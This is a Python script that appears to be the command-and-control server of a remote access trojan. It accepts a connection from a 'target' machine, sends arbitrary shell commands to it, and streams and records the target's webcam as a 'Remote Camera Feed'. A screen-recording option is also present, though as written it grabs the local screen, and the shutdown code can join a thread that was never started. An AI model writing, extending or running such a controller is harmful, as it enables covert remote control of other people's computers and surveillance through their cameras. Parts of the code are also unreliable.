import socket # For network (client-server) communication.
import cv2 # For video recording.
import signal # For handling the ctrl+c command when exiting the program.
import threading # For running the video recording in a seperate thread.
import numpy as np # For working with video frames.
import mss
import pyautogui


SERVER_HOST = "0.0.0.0" # Bind the server to all available network interfaces.
SERVER_PORT = 4000
BUFFER_SIZE = 1024 * 128  # 128KB max size of messages. You can adjust this to your taste
# Separator string for sending 2 messages at a time
SEPARATOR = "<sep>"

# Create the socket object.
s = socket.socket()
# Bind the socket to all IP addresses of this host.
s.bind((SERVER_HOST, SERVER_PORT))
# Make the PORT reusable
s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
# Set the maximum number of queued connections to 5.
s.listen(5)
print(f"Listening as {SERVER_HOST} on port {SERVER_PORT} ...")
# Accept any connections attempted.
client_socket, client_address = s.accept()
print(f"{client_address[0]}:{client_address[1]} Connected!")
# Receive the current working directory and os of the target (client).
cwd = client_socket.recv(BUFFER_SIZE).decode()
targets_os = client_socket.recv(BUFFER_SIZE).decode()
# Print the info received.
print("[+] Current working directory: ", cwd)
print("[+] Target's Operating system: ", targets_os)
# Set up the video capture and writer.
cap = None
out = None
recording_thread = None
screenrec_thread = None

# Function to handle Ctrl+C signal.
def signal_handler(sig, frame):
    print('Saving video and exiting...')
    if recording_thread is not None:
        recording_thread.join()
    if cap is not None and out is not None:
        cap.release()
        out.release()
    cv2.destroyAllWindows()
    client_socket.close()
    s.close()
    exit(0)
# Set up the signal handler.
signal.signal(signal.SIGINT, signal_handler)

# Function to record and display the video.
def record_video():
    global out
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter('outputcam.mp4', fourcc, 30.0, (640, 480))
    while True:
        # Receive the frame size.
        frame_size = int.from_bytes(client_socket.recv(4), byteorder='little')
        # Receive the frame data.
        frame_data = b''
        while len(frame_data) < frame_size:
            packet = client_socket.recv(min(BUFFER_SIZE, frame_size - len(frame_data)))
            if not packet:
                break
            frame_data += packet
        if not frame_data:
            break
        # Decode the frame.
        frame = cv2.imdecode(np.frombuffer(frame_data, dtype=np.uint8), cv2.IMREAD_COLOR)
        # Write the frame to the video file.
        out.write(frame)
        # Display the frame.
        cv2.imshow('Remote Camera Feed', frame)
        if cv2.waitKey(1) & 0xFF == ord('q'):
            break
    out.release()
    client_socket.close()
    cv2.destroyAllWindows()
    
def record_screen():
    global out
    # Setup for saving the video
    fourcc = cv2.VideoWriter_fourcc(*'mp4v')
    out = cv2.VideoWriter('outputscreen.mp4', fourcc, 30.0, (640, 480))

    # Capture the screen
    with mss.mss() as sct:
        monitor = sct.monitors[1]  # Select the first monitor (change index if necessary)
        
        while True:
            # Capture the screen as a screenshot
            img = sct.grab(monitor)
            frame = np.array(img)  # Convert to numpy array
            frame = cv2.cvtColor(frame, cv2.COLOR_BGRA2BGR)  # Remove alpha channel if present

            # Send the frame size over socket (optional, based on your code)
            # frame_size = len(frame.tobytes())
            # client_socket.send(frame_size.to_bytes(4, byteorder='little'))

            # Write the frame to the video file
            out.write(frame)

            # Display the frame
            cv2.imshow('Screen Recording', frame)

            # Break on 'q' key press
            if cv2.waitKey(1) & 0xFF == ord('q'):
                break

    # Release everything once done
    out.release()
    cv2.destroyAllWindows()



while True:
    # Get the command from the user.
    command = input(f"{cwd} $> ")
    if not command.strip():
        # Empty command.
        continue
    # Send the command to the client.
    client_socket.send(command.encode())
    if command.lower() == "exit":
        # If the command is exit, just break out of the loop.
        break
    elif command.lower() == "start cam":
        # Start recording video in a separate thread.
        recording_thread = threading.Thread(target=record_video)
        recording_thread.start()
        output = "Video recording started."
        print(output)
    elif command.lower() == "start screen":
        # Start recording video in a separate thread.
        screenrec_thread = threading.Thread(target=record_screen)
        screenrec_thread.start()
        output = "screen recording started."
        print(output)
    else:
        # Receive the results from the client.
        output = client_socket.recv(BUFFER_SIZE).decode()
        results, cwd = output.split(SEPARATOR)
        print(results)
# Close the connection to the client and server.
if recording_thread is not None:
    recording_thread.join()
    screenrec_thread.join()
client_socket.close()
s.close()